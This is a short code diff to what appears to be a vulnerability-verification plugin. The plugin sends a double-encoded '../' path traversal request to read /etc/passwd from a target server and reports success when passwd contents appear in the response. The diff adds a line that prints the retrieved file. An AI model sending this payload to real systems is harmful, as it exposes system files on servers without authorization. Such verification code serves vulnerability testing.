@@ -38,6 +38,7 @@ class TestPOC(POCBase):
         target = vul_url+"/foo/default/master/..%252F..%252F..%252F..%252Fetc%252fpasswd"
         response_code = req.get(target).status_code
         r = req.get(target)
+        print(r.text)
         if response_code == 200 and "bin" in r.text and "/usr/sbin" in r.text and "root" in r.text:
             result['VerifyInfo'] = "success"
         pass
